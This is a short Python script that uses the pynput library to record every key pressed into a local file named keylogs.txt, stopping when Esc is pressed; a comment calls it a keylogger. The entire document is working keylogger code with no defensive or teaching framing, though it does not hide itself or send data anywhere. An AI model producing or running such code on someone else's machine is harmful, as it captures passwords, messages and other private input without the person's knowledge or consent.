from pynput.keyboard import Listener, Key

# Function to write keystrokes to a file
def on_press(key):
    try:
        with open("keylogs.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open("keylogs.txt", "a") as log_file:
            log_file.write(f"{key}")

# Function to handle errors or end the keylogger
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
